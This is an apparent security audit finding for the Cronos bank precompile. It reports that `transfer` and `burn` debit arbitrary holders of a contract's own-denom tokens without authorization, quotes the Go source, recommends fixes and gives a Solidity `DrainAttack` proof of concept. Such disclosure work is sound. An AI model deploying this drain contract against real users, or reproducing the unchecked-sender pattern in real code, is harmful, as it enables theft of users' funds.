### Title
Bank Precompile `transfer` and `burn` Allow Any Contract to Drain Arbitrary Holders of Its Own-Denom Tokens Without Authorization — (File: x/cronos/keeper/precompiles/bank.go)

---

### Summary

The bank precompile's `transfer` and `burn` methods allow any EVM contract to move or destroy `evm/<contract_address>` native bank tokens from **any holder's account** without the holder's consent or any approval check. A malicious contract can mint its own-denom tokens to users, wait for those tokens to acquire value (e.g., as DeFi collateral), then unilaterally drain or burn them from victims' accounts.

---

### Finding Description

In `x/cronos/keeper/precompiles/bank.go`, the `Run` method handles three state-mutating operations: `mint`, `burn`, and `transfer`. The denom for all three is derived as `EVMDenom(contract.Caller())` — i.e., `"evm/" + callerAddress.Hex()` — scoping each operation to the calling contract's own token type.

**`transfer` (lines 167–200):**

```go
sender    := args[0].(common.Address)   // arbitrary, caller-supplied
recipient := args[1].(common.Address)
amount    := args[2].(*big.Int)

from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
denom := EVMDenom(contract.Caller())    // scoped to caller's denom
amt   := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))

bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

There is **no check** that `sender == contract.Caller()`, nor any approval/allowance mechanism. The contract supplies an arbitrary `sender` address and the bank module executes the transfer unconditionally.

**`burn` (lines 113–155):**

```go
recipient := args[0].(common.Address)   // address to burn FROM — arbitrary
...
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt))
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt))
```

Again, `addr` (the address whose tokens are burned) is caller-supplied with no authorization check. [1](#0-0) [2](#0-1) 

The denom scoping (`EVMDenom(contract.Caller())`) limits the attack surface to the contract's own token type, but within that scope the contract has **unrestricted authority over every holder's balance** — exactly the same structural flaw as the external report, where a per-token manager could affect the entire pool.

---

### Impact Explanation

**Critical — Unauthorized transfer/burn of precompile-controlled assets.**

Attack flow:
1. Attacker deploys `MaliciousContract`.
2. `MaliciousContract` calls `bank.mint(victim, 1_000_000)` → victim now holds `1_000_000 evm/<MaliciousContract>` native bank tokens.
3. Victim deposits these tokens as collateral in a DeFi protocol (lending, AMM, etc.).
4. `MaliciousContract` calls `bank.transfer(victim, attacker, 1_000_000)` — the bank module executes `SendCoins(victim → attacker)` with no consent from victim.
5. Victim's collateral is drained; attacker profits.

Alternatively, `bank.burn(victim, 1_000_000)` destroys the victim's tokens entirely, enabling collateral manipulation or protocol insolvency.

This bypasses the Cosmos SDK bank module's core invariant that only the token holder (or an explicitly authorized spender) can authorize a debit from their account. [3](#0-2) 

---

### Likelihood Explanation

**High.** Any unprivileged user can deploy an EVM contract on Cronos and call the bank precompile at `0x0000000000000000000000000000000000000064`. No admin keys, governance access, or special permissions are required. The only precondition is that victims hold `evm/<contract_address>` tokens with economic value — a condition that is satisfied whenever the contract's tokens are integrated into DeFi protocols. [4](#0-3) 

---

### Recommendation

1. **`transfer`**: Add a check that `sender == contract.Caller()`. If third-party transfers are intentional, implement an ERC20-style allowance mapping within the precompile so that `sender` must have explicitly approved the caller.

2. **`burn`**: Add a check that `addr == sdk.AccAddress(contract.Caller().Bytes())`. Burning from an arbitrary third-party address without consent should not be permitted.

3. **General**: Document the security model of the bank precompile explicitly: contracts have sovereign control over their own denom, including the ability to move tokens from any holder. If this is intentional, users and integrating protocols must be warned.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function mint(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
    function burn(address addr, uint256 amount) external returns (bool);
}

contract DrainAttack {
    IBankPrecompile constant BANK = IBankPrecompile(0x0000000000000000000000000000000000000064);

    // Step 1: Mint evm/<this> tokens to victim (e.g., as a "reward" or "airdrop")
    function seedVictim(address victim, uint256 amount) external {
        BANK.mint(victim, amount);
    }

    // Step 2: After victim deposits tokens as collateral elsewhere,
    //         drain them back — no victim signature required
    function drain(address victim, address attacker, uint256 amount) external {
        // bank.transfer(from=victim, to=attacker, amount) — no auth check
        BANK.transfer(victim, attacker, amount);
    }

    // Alternative: destroy victim's tokens to manipulate collateral ratios
    function destroyVictimTokens(address victim, uint256 amount) external {
        BANK.burn(victim, amount);
    }
}
```

`BANK.transfer(victim, attacker, amount)` executes `bankKeeper.SendCoins(victim, attacker, coins)` directly in the Cosmos bank module with no authorization from `victim`, draining their `evm/<DrainAttack>` balance. [5](#0-4)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L30-34)
```go
var (
	bankABI                 abi.ABI
	bankContractAddress     = common.BytesToAddress([]byte{100})
	bankGasRequiredByMethod = map[[4]byte]uint64{}
)
```

**File:** x/cronos/keeper/precompiles/bank.go (L103-203)
```go
func (bc *BankContract) Run(evm *vm.EVM, contract *vm.Contract, readonly bool) ([]byte, error) {
	// parse input
	methodID := contract.Input[:4]
	method, err := bankABI.MethodById(methodID)
	if err != nil {
		return nil, err
	}
	stateDB := evm.StateDB.(ExtStateDB)
	precompileAddr := bc.Address()
	switch method.Name {
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
	case BalanceOfMethodName:
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		token := args[0].(common.Address)
		addr := args[1].(common.Address)
		// query from storage
		balance := bc.bankKeeper.GetBalance(stateDB.Context(), sdk.AccAddress(addr.Bytes()), EVMDenom(token)).Amount.BigInt()
		return method.Outputs.Pack(balance)
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
	default:
		return nil, errors.New("unknown method")
	}
```
